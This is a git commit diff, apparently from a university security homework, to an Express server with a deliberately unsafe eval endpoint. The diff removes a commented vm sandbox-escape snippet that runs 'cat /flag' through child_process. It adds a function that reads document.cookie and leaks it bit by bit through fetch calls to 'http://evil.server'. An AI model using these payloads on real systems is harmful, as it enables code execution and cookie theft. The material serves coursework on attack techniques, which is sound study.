bbd2a7de15152084a8661571421e098fa375ca29
Yanan Sun <yanansun@andrew.cmu.edu>
2020-04-13 16:20:03 -0700

    fix bug

--- hw3/unsafe-eval/server.js
+++ hw3/unsafe-eval/server.js
@@ -16,11 +16,39 @@ app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 app.use(express.static('static'))
 
 app.get('/', (req, res) => {
+  var a ="1";
+  if(a){
+    console.log(a)
+  }
   res.sendFile(path.join(__dirname, '/static/index.html'));
 });
 
 
 app.post('/eval_to_json', (req, res) => {
+  var a ="";
+  var nop ;
+  if(a){
+    nop = "nop" ;
+  }else{
+    nop = "nop"
+  }
+  var b = nop + nop ;
+  console.log(b)
+
+
+  var c = "cookie";
+  var d = "1 + 1 = 3";
+  var x_prime = c + d ;
+  var obj = {lol : x_prime}
+  if(obj.lol[0] > test ){
+    hacker = "http://evil.server/?true";
+  } else{
+    hacker = "http://evil.server/?false";
+  }
+
+
+
+
   if (req.body && req.body.eval){
     try {
       var ss = req.body.eval
@@ -43,9 +71,28 @@ app.listen(PORT, HOST);
 console.log(`Running on http://${HOST}:${PORT}`);
 
 
-/*
-"use strict";
-const vm = require("vm");
-const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
-process.mainModule.require('child_process').execSync('cat /flag').toString()`);
-console.log(xyz);*/
+async function q3_h4x(woops) {
+  await fetch(woops)
+}
+
+function q3(idx, test) {
+  var c = document.cookie;
+  var x = "1 + 1 = 3"
+  var x_prime = c + x;
+  var obj = {lol : x_prime}
+  var hacker;
+  if(obj.lol[idx] > test ){
+    hacker = "http://evil.server/?true";
+  } else{
+    hacker = "http://evil.server/?false";
+  }
+  q3_h4x(hacker)
+
+  var nop;
+  if(c){
+    nop = "nop" ;
+  }else{
+    nop = "nop"
+  }
+  return nop + nop;
+}
